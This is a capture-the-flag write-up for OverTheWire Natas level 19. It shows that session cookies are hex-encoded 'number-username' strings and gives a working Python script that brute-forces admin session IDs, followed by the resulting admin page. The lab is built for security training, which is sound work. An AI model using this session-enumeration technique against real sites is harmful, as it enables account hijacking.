# Natas19
#natas #burp-suite #Session 
## Vulnerability:
The application uses session IDs stored in the `PHPSESSID` cookie. Unlike Natas18, session IDs are no longer sequential. However, they remain predictable and unprotected.
## Technique:
Enumerated possible administrator session IDs by generating `PHPSESSID` values and sending them in requests until a valid administrator session was identified.
#### Steps:
###### 1) Analyzing the application cookies
We logged in using the credentials:
*Username:* `test`
*Password:* `test`

Then, we were assigned the following `PHPSESSID` cookie: `3331322d74657374`.
Next, we changed the password to: `azertyuiopqsdfghjklmwxcvbn,;:!&é"'(-è_çà)=` 
and we obtained the cookie: `34372d74657374`

After that, we used the first password and the following username: `azertyuiopqsdfghjklmwxcvbn,;:!&é"'(-è_çà)=`
which gave us the cookie: `3530322d617a6572747975696f707173646667686a6b6c6d77786376626e2c3b3a2126c3a92227282dc3a85fc3a7c3a0293d`

We concluded that the username directly influences the value stored in the `PHPSESSID` cookie, while changing only the password does not affect it.
###### 2) Decoding the Session ID
The values stored in the `PHPSESSID` cookie appeared to be a hexadecimal string. By decoding several cookie values from hexadecimal to ASCII, it became clear that they followed the format:
```
<session_number>-<username>
```
For example:
```
3331322d74657374
↓
312-test
```
This revealed that the application was not encrypting the session ID; it was simply encoding it in hexadecimal.
###### 3) Enumerating administrator sessions
We used Python to automate requests while sending different `PHPSESSID` cookie values. Each time, the `session number` changes, and the `username` remains the same: `admin`.
**Python script:**
```python
import requests  
url = "http://natas19.natas.labs.overthewire.org/"  
auth = ('natas19', <NATAS18_PASSWORD>)  
  
data = {  
        "username": "admin",  
        "password": "1234",  
    }  
for i in range(1000):  
    nb = str(i) + "-admin"  
    cookie = {  
        "PHPSESSID": nb.encode().hex()  
    }  
    r = requests.post(url, data=data, cookies=cookie, auth=auth)  
    response = r.text  
    if "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20." not in response:  
        print("Interesting response: ")  
        print("Cookie: ", cookie["PHPSESSID"])  
        print(response)  
        break  
  
    if i % 10 == 0:  
       print(f"[{i}] Still processing...")
```
**Result:**
```
[0] Still processing...
[10] Still processing...
[20] Still processing...
[30] Still processing...
[40] Still processing...
[50] Still processing...
[60] Still processing...
[70] Still processing...
[80] Still processing...
[90] Still processing...
[100] Still processing...
[110] Still processing...
[120] Still processing...
[130] Still processing...
[140] Still processing...
[150] Still processing...
[160] Still processing...
[170] Still processing...
[180] Still processing...
[190] Still processing...
[200] Still processing...
[210] Still processing...
[220] Still processing...
[230] Still processing...
[240] Still processing...
[250] Still processing...
[260] Still processing...
[270] Still processing...
[280] Still processing...
Interesting response: 
Cookie: 3238312d61646d696e
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas19",
            "pass": <NATAS18_PASSWORD>
        };
    </script>
</head>

<body>
    <h1>natas19</h1>

    <div id="content">
        <p>
            <b>
                This page uses mostly the same code as the previous level,
                but session IDs are no longer sequential...
            </b>
        </p>

        <br />

        <b>Warning</b>:
        preg_match(): Allocation of JIT memory failed, PCRE JIT will be disabled.
        This is likely caused by security restrictions. Either grant PHP permission
        to allocate executable memory, or set pcre.jit=0 in
        <b>/var/www/natas/natas19/index.php</b> on line <b>49</b>

        <br />

        You are an admin. The credentials for the next level are:
        <br />

        <pre>
Username: natas20
Password: <PASSWORD>
        </pre>
    </div>
</body>
</html>
```
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas18](./Natas18.md)
## Next Level:
[Natas20](./Natas20.md)
